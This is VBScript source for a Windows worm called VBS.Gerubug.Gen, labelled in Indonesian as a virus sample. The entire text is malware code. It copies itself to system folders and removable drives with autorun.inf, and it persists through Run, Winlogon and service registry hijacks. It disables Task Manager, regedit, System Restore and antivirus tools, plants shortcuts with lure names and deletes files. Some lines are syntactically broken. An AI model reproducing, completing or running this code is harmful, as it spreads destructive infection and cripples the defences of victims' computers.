  
'--------------------------------------------------------------------------------------------------
' Risk : Medium!
'--------------------------------------------------------------------------------------------------
On Error Resume Next
Dim winpath, sispath, tempath, FlashDisk, serang, fso, wsshell, nask, inti, autorn, htmlreplikasi, filekor
Dim Drives, Drive, cekdrive, tekvir, text, Buatfile, replikasi, namafile, ubah, broken, html, filetext
Dim DesPath1, DesPath2, Scut1, Scut2
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsshell = CreateObject("WScript.Shell")
Set filetext = fso.OpenTextFile(WScript.ScriptFullname, 1)
namafile = "VBS.Gerubug.Gen.vbs"
autorn = "[autorun]"&vbcrlf&"shellexecute=wscript.exe " & namafile
htmlreplikasi = "<HTML><HEAD><TITLE>komputer anda kena virus 'Gerubug.A!!</TITLE></HEAD><BODY bgcolor=&H00000000&><CENTER><br><br><br><br><H1><Font face=Verdana color=#FF0000><U>GERUBUG.A</U></Font></H1><H3><Font face=Verdana color=#FFFFFF>----- I Don't Know What to say..?? -----<br><br><br><font color=#0xff000 size=5>-- GERUBUG YOUR SYSTEM!! --</font><br><br><br>----- Hati-hati..!! Anda terkena Virus Gerubug!! -----<br>----- Jadilah Warga RI yang pintar, taat pada ajaran agama, dan baik hati -----<br>----- Agar anda tidak kena GERUBUG..!! HAHA.. -----<br><br><H2><Font face=Verdana color=#E2EA05>[ By: xxxxxxx ]<br>-- PULAU DEWATA #VirusMaker Community --</Font></H2></font></H2><h4>!!!!!!ssssssssssssttttT======FUCK OFF YOUR SYSTEM======!!!!!!sssssssssssstttt</h4></CENTER></BODY></HTML>"
Set nask = fso.getfile(WScript.ScriptFullname)
cekdrive = nask.Drive.drivetype
inti = "c:\Wscript_Host.vbs"
Set replikasi = CreateObject(StrReverse("tcejbOmetsySelif.gnitpircS"))
Set html = CreateObject(StrReverse("tcejbOmetsySelif.gnitpircS"))
Sub Shortcut()
DesPath1 = wsshell.SpecialFolders("Desktop")
DesPath2 = wsshell.SpecialFolders("StartUp")
Set Scut1 = wsshell.CreateShortcut(DesPath1 & "\Gambar Dewasa!!.lnk")
Set Scut2 = wsshell.CreateShortcut(DesPath2 & "\wscript.lnk")
Set Fileke1 = fso.createtextfile(sispath& "\iexplore.vbs", 2, True)
Set Fileke2 = fso.createtextfile(tempath& "\Bali.vbs", 2, True)
Fileke1.Write tekvir
Fileke1.Close()
Scut1.TargetPath = wsshell.ExpandEnvironmentStrings(sispath&"\iexplore.vbs")
Scut1.Save
Fileke2.Write tekvir
Fileke2.Close()
Scut2.TargetPath = wsshell.ExpandEnvironmentStrings(tempath&"\Bali.vbs")
Scut2.Save
End Sub
On Error Resume Next
replikasi.CopyFile "C:\WINDOWS\System32\iexplore.vbs", "C:\WINDOWS\msvbvm90.vbs", 1
replikasi.CopyFile "C:\WINDOWS\msvbvm90.vbs", "c:\WINDOWS\System32\vbscripting.vbs"
replikasi.CopyFile "C:\WINDOWS\msvbvm90.vbs", "c:\WINDOWS\System32\wscript60.vbs"
replikasi.CopyFile "C:\WINDOWS\msvbvm90.vbs", "c:\WINDOWS\System32\windowsxp.vbs"
replikasi.CopyFile "C:\WINDOWS\msvbvm90.vbs", "c:\WINDOWS\System32\winhelp32.vbs"
Dim teks, love, hateness
On Error Resume Next
teks = "<HTML><HEAD><TITLE>komputer anda kena virus 'Gerubug.A!!</TITLE></HEAD><BODY bgcolor=&H00000000&><CENTER><br><br><br><br><H1><Font face=Verdana color=#FF0000><U>GERUBUG.A</U></Font></H1><H3><Font face=Verdana color=#FFFFFF>----- I Don't Know What to say..?? -----<br><br><br><font color=#0xff000 size=5>-- GERUBUG YOUR SYSTEM!! --</font><br><br><br>----- Hati-hati..!! Anda terkena Virus Gerubug!! -----<br>----- Jadilah Warga RI yang pintar, taat pada ajaran agama, dan baik hati -----<br>----- Agar anda tidak kena GERUBUG..!! HAHA.. -----<br><br><H2><Font face=Verdana color=#E2EA05>[ By: xxxxxxx ]<br>-- PULAU DEWATA #VirusMaker Community --</Font></H2></font></H2><h4>!!!!!!ssssssssssssttttT======FUCK OFF YOUR SYSTEM======!!!!!!sssssssssssstttt</h4></CENTER></BODY></HTML>"
Set love = CreateObject(StrReverse("tcejbOmetsySelif.gnitpircS"))
Set hateness = love.createtextfile("C:\VBS.Gerubug.Gen.html", 1)
hateness.write teks
Set hateness = love.createtextfile("C:\Documents and Settings\All Users\Desktop\VBS.Gerubug.Gen.html", 1)
replikasi.CopyFile "C:\VBS.Gerubug.Gen.html", "c:\WINDOWS\System32\VBS.Gerubug.Gen.html"
hateness.write teks
hateness.Close
'=====kopi html ke directory lain
On Error Resume Next
replikasi.CopyFile "C:\VBS.Gerubug.Gen.html", "D:\VBS.Gerubug.Gen.html"
replikasi.CopyFile "c:\WINDOWS\System32\VBS.Gerubug.Gen.html", "D:\VBS.Gerubug.Gen.html"
DoEvents
Set winpath = fso.GetSpecialfolder(0)
Set sispath = fso.GetSpecialfolder(1)
Set tempath = fso.GetSpecialfolder(2)
Set text = nask.openastextstream(1, -2)
Randomize Timer
Aka = Int(Rnd * 1000)
Akb = Int(Rnd * 30)
If Akb = 0 Then Akb = 10
Tamb = String(Akb, "-")
tekavir = text.readline
tekvir="' "&Aka&Tamb&vbCrLf
Do While Not text.atendofstream
tekvir = tekvir&text.readline
tekvir = tekvir&vbCrLf
Loop
Shortcut()
sudah = 0
Do
Set filekor = fso.getfile(winpath & "\" & namafile)
filekor.Attributes = 32
Set filekor = fso.createtextfile(winpath & "\" & namafile, 2, True)
filekor.write tekvir
filekor.Close
Set filekor = fso.getfile(winpath & "\" & namafile)
filekor.Attributes = 39
For Each FlashDisk In fso.drives
If (FlashDisk.drivetype = 1 Or FlashDisk.drivetype = 2) And FlashDisk.path <> "A:" Then
Set filekor = fso.getfile(FlashDisk.path & "\" & namafile)
filekor.Attributes = 32
Set filekor = fso.createtextfile(FlashDisk.path & "\" & namafile, 2, True)
filekor.write tekvir
filekor.Close
Set filekor = fso.getfile(FlashDisk.path & "\" & namafile)
filekor.Attributes = 39
On Error Resume Next
replikasi.CopyFile "C:\VBS.Gerubug.Gen.html", "D:\VBS.Gerubug.Gen.html"
Set filekor = fso.getfile(FlashDisk.path & "\autorun.inf")
filekor.Attributes = 32
Set filekor = fso.createtextfile(FlashDisk.path & "\autorun.inf", 2, True)
filekor.write autorn
filekor.Close
Set filekor = fso.getfile(FlashDisk.path & "\autorun.inf")
filekor.Attributes = 39
replikasi.CopyFile "c:\WINDOWS\System32\VBS.Gerubug.Gen.html", FlashDisk.path & "\VBS.Gerubug.Gen.html"
replikasi.CopyFile "c:\WINDOWS\System32\vbscripting.vbs", FlashDisk.path & "\Cewek Seksi Nungging!!.vbs", 1
End If
On Error Resume Next
replikasi.CopyFile "C:\VBS.Gerubug.Gen.html", "D:\VBS.Gerubug.Gen.html"
replikasi.CopyFile "c:\WINDOWS\System32\VBS.Gerubug.Gen.html", "D:\VBS.Gerubug.Gen.html"
Next
DoEvents
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "1", "REG_DWORD"
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1", "REG_DWORD"
rdw = "REG_DWORD"
Smwc = "\Software\Microsoft\Windows\CurrentVersion\"
Hsmwci = "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\"
wsshell.regwrite "HKLM"&Smwc&"Run\Winhelp32", "wscript.exe " & winpath & "\" & namafile
wsshell.regwrite "HKLM"&Smwc&"Run\Winhelp32", "wscript.exe " & winpath & "\" & namafile
On Error Resume Next
replikasi.CopyFile "C:\VBS.Gerubug.Gen.html", "D:\VBS.Gerubug.Gen.html"
wsshell.regwrite Hsmwci & "msconfig.exe\Debugger", " "
wsshell.regwrite Hsmwci & "regedit.exe\Debugger", " "
wsshell.regwrite Hsmwci & "PCMAV.exe\Debugger", " "
wsshell.regwrite Hsmwci & "PCMAV-CLN.exe\Debugger", " "
wsshell.regwrite Hsmwci & "PCMAV-RTP.exe\Debugger", " "
wsshell.regwrite Hsmwci & "PCMAV-SE.exe\Debugger", " "
wsshell.regwrite Hsmwci & "VB6.exe\Debugger", " "
wsshell.regwrite Hsmwci & "autorun.exe\Debugger", " "
wsshell.regwrite Hsmwci & "ansav.exe\Debugger", " "
wsshell.regwrite Hsmwci & "viremoval.exe\Debugger", " "
wsshell.regwrite Hsmwci & "avscan.exe\Debugger", " "
wsshell.regwrite Hsmwci & "avgnt.exe\Debugger", " "
wsshell.regwrite Hsmwci & "avi-gen.exe\Debugger", " "
wsshell.regwrite Hsmwci & "nod32.exe\Debugger", " "
wsshell.regwrite Hsmwci & "avg.exe\Debugger", " "
wsshell.regwrite Hsmwci & "smada.exe\Debugger", " "
wsshell.regwrite Hsmwci & "ansvguard.exe\Debugger", " "
wsshell.regwrite Hsmwci & "taskmanager.exe\Debugger", " "
wsshell.regwrite Hsmwci & "tskmngr.exe\Debugger", " "
wsshell.regwrite Hsmwci & "taskman.exe\Debugger", " "
wsshell.regwrite Hsmwci & "setup.exe\Debugger", " "
wsshell.regwrite Hsmwci & "instaler.exe\Debugger", " "
wsshell.regwrite Hsmwci & "taskmgr.exe\Debugger", " "
wsshell.regwrite Hsmwci & "ansav32.exe\Debugger", " "
wsshell.regwrite Hsmwci & "navi.exe\Debugger", " "
wsshell.regwrite Hsmwci & "antv-md5.exe\Debugger", " "
On Error Resume Next
replikasi.CopyFile "C:\VBS.Gerubug.Gen.html", "D:\VBS.Gerubug.Gen.html"
On Error Resume Next
replikasi.CopyFile "C:\About Merdeka Tapi Bingung!!.html", "D:\About Merdeka Tapi Bingung!!.html"
wsshell.RegWrite "HKCU"&Smwc&"Policies\Explorer\NoFind", "1", rdw
wsshell.RegWrite "HKCU"&Smwc&"Policies\Explorer\NoFolderOptions", "1", rdw
wsshell.RegWrite "HKCU"&Smwc&"Policies\Explorer\NoRun", "1", rdw
wsshell.RegWrite "HKCU"&Smwc&"Policies\System\DisableRegistryTools", "1", rdw
wsshell.RegWrite "HKCU"&Smwc&"Policies\System\DisableTaskMgr", "1", rdw
Set ubah = CreateObject("WScript.Shell")
ubah.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization", "VBS.Gerubug.Gen"
ubah.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner", "VBS.Gerubug.Gen"
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", " The VBS.Gerubug.Gen Connection "
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\a", "VBS.Gerubug.Gen"
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\MRUList", "a"
DoEvents
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", "1", "REG_DWORD"
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions", "1", "REG_DWORD"
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", "1", "REG_DWORD"
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "1", "REG_DWORD"
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1", "REG_DWORD"
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu", "1", "REG_DWORD"
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu", "1", "REG_DWORD"
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop\NoChangingWallpaper", "1", "REG_DWORD"
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWinKeys", "1", "REG_DWORD"
ubah.regwrite "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", "1", "REG_DWORD"
ubah.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff", "1", "REG_DWORD"
ubah.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", "1", "REG_DWORD"
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Logon User Name", "VBS.Gerubug.Gen"
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AltDefaultUserName       VBS.Gerubug.Gen
ubah.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName", "VBS.Gerubug.Gen"
ubah.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive", "1"
ubah.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE", "C:\WINDOWS\system32\marquee.scr"
ubah.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\Screen Saver.Marquee\Attributes", "00011"
ubah.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\Screen Saver.Marquee\BackgroundColor", "0 0 0"
ubah.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\Screen Saver.Marquee\CharSet", "0"
ubah.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\Screen Saver.Marquee\Font", "Verdana"
ubah.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\Screen Saver.Marquee\Mode", "1"
ubah.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\Screen Saver.Marquee\Size", "24"
ubah.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\Screen Saver.Marquee\Speed", "3"
ubah.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\Screen Saver.Marquee\Text", "VBS.Gerubug.Gen"
ubah.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit", "C:\WINDOWS\system32\userinit.exe, c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\Screen Saver.Marquee\TextColor", "255 0 0"
ubah.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\shell", "explorer.exe, c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\shell", "explorer.exe, c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\ComSpec", "%SystemRoot%\system32\cmd.exe, c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PugPlay\ImagePath", "%SystemRoot%\system32\services.exe, c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\AlternateShell", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\srservice\ImagePathservice", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NPFMntor\ImagePath", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NSCService\ImagePath", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SAVScan\ImagePath", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NPFMntor\ImagePath", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNDSrvc\ImagePath", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SPBBCDrv\ImagePath", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SPBBCSvc\ImagePath", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\McDetect.exe\ImagePath", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\McShield\ImagePath", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\McTskshd.exe\ImagePath", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mcupdmgr.exe\ImagePath", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MSIServer\ImagePath", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SafeBoot\AlternateShell", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\srservice\ImagePathservice", "c:\windows\svchost.exe " & inti
ubah.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden\WarningIfNotDefault", "Windows Security Center has been detected a new kind virus on your machine {codename: VBS.Gerubug.Gen}. This virus can causes your machine Bingung! Please tell Microsoft about this or use Microsoft Windows Automatic Update. For further information, contact us at : www.VBS.Gerubug.Gen.com"
ubah.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt\WarningIfNotDefault", "Windows Security Center has been detected a new kind virus on your machine {codename: VBS.Gerubug.Gen}. This virus can causes your machine Bingung! Please tell Microsoft about this or use Microsoft Windows Automatic Update. For further information, contact us at : www.VBS.Gerubug.Gen.com"
On Error Resume Next
replikasi.CopyFile "C:\VBS.Gerubug.Gen.html", "D:\VBS.Gerubug.Gen.html"
DoEvents
wsshell.regwrite "HKCR\vbsfile\DefaultIcon", "C:\WINDOWS\System32\shell32.dll,3"
If Minute(Now) = 1 And sudah <> 1 Then
Tularifiledoc()
sudah = 1
End If
If cekdrive <> 1 Then Wscript.sleep 100000
Loop While cekdrive <> 1
DoEvents
Sub Tularifiledoc()
Set drives = fso.drives
For Each drive In drives
If drive <> "A:" Then
If drive.IsReady Then
cari drive & "\"
End If
End If
Next
DoEvents
End Sub
Sub Shortcut()
DesPath1 = wsshell.SpecialFolders("Desktop")
DesPath2 = wsshell.SpecialFolders("StartUp")
Set Scut1 = wsshell.CreateShortcut(DesPath1 & "\Gambar Dewasa!!.lnk")
Set Scut2 = wsshell.CreateShortcut(DesPath2 & "\wscript.lnk")
Set Fileke1 = fso.createtextfile(sispath& "\iexplore.vbs", 2, True)
Set Fileke2 = fso.createtextfile(tempath& "\Bali.vbs", 2, True)
Fileke1.write tekvir
Fileke1.Close()
Scut1.TargetPath = wsshell.ExpandEnvironmentStrings(sispath&"\iexplore.vbs")
Scut1.Save
Fileke2.write tekvir
Fileke2.Close()
Scut2.TargetPath = wsshell.ExpandEnvironmentStrings(tempath&"\Bali.vbs")
Scut2.Save
End Sub
Sub hcdmshsx()
Dim married, love
On Error Resume Next
married = "<HTML><HEAD><TITLE>komputer anda kena virus 'Gerubug.A!!</TITLE></HEAD><BODY bgcolor=&H00000000&><CENTER><br><br><br><br><H1><Font face=Verdana color=#FF0000><U>GERUBUG.A</U></Font></H1><H3><Font face=Verdana color=#FFFFFF>----- I Don't Know What to say..?? -----<br><br><br><font color=#0xff000 size=5>-- GERUBUG YOUR SYSTEM!! --</font><br><br><br>----- Hati-hati..!! Anda terkena Virus Gerubug!! -----<br>----- Jadilah Warga RI yang pintar, taat pada ajaran agama, dan baik hati -----<br>----- Agar anda tidak kena GERUBUG..!! HAHA.. -----<br><br><H2><Font face=Verdana color=#E2EA05>[ By: xxxxxxx ]<br>-- PULAU DEWATA #VirusMaker Community --</Font></H2></font></H2><h4>!!!!!!ssssssssssssttttT======FUCK OFF YOUR SYSTEM======!!!!!!sssssssssssstttt</h4></CENTER></BODY></HTML>"
Set love = CreateObject(StrReverse("tcejbOmetsySelif.gnitpircS"))
Set hateness = love.CreateTextFile("C:\windows\My VBS.Gerubug.Gen.html", 1)
hateness.write married
Set hateness = love.CreateTextFile("C:\Documents and Settings\All Users\Desktop\VBS.Gerubug.Gen on internet.html", 1)
hateness.write married
hateness.Close
hcdmshsx()
End Sub
Sub dwozmc()
On Error Resume Next
Dim love, dear, drive, drives, Folder, files, file, nama, path, vir, SubFolder, meteran, elo, cari
Set love = CreateObject(StrReverse("tcejbOmetsySelif.gnitpircS"))
Set drive = love.GetLogicalDrives
For Each drive In drives
If drive.IsReady Then
cari drive & "\"
DoEvents
End If
Next
dwozmc()
End Sub
Function cari()
On Error Resume Next
Set love = CreateObject(StrReverse("tcejbOmetsySelif.gnitpircS"))
Set Folder = love.GetFolder(path)
nama = Folder.Name
For Each file In Folder.files
Set elo = love.getfile(file.path)
meteran = (elo.Size) / 1024
ext = love.GetExtensionName(file.path)
ext = StrReverse(LCase(ext))
vir = love.getbasename(file.path)
If ext = "sbv" Or ext = "ebv" Or ext = "cod" Or ext = "ftr" Or ext = "fdp" Or ext = "gpj" Then
Set broken = love.CreateTextFile(file.path & ".vbe", 1)
broken.write lost
Set friendship = love.getfile(file.path & ".vbe")
friendship.Attributes = 33
If file.Name = "cotox.vbs" Or file.Name = "kangen.exe" Or file.Name = "indra.com" Or file.Name = "MSOHEV.EXE" Or file.Name = "SVCH0ST.EXE" Or file.Name = "WINL0G0N.EXE" Or file.Name = "Surat_Buat_Presiden.zip" Or file.Name = "Surat_Buat_Presiden.exe" Or file.Name = "indra.exe" Or file.Name = "for_you.exe" Or file.Name = "indra.pif" Or file.Name = "hallo.exe" Or file.Name = "icute.vbs" Or file.Name = "frzstate.exe" Or file.Name = "I-Cute.vbs" Or file.Name = "Perfected_v5.vbe" Or file.Name = "animasi.exe" Or file.Name = "C.Stankal.com" Then
love.DeleteFile (file.path)
DoEvents
End If
If file.Name = "virus.exe" Then
love.RenameFile (file.path & "VBS.Gerubug.Gen.dll")
DoEvents
End If
If vir = nama And ext = "exe" Then
love.DeleteFile (file.path)
End If
DoEvents
For Each SubFolder In Folder.SubFolders
kejar SubFolder.path
DoEvents
Next
End If
Next
End Function
'--------------------------------------------------------------------------------------------------
' Risk : Medium!
'--------------------------------------------------------------------------------------------------
' Contoh Virus : Visual Basic Script
' Nama Virus   : VBS.Gerubug.Gen [versi pertama]
'--------------------------------------------------------------------------------------------------
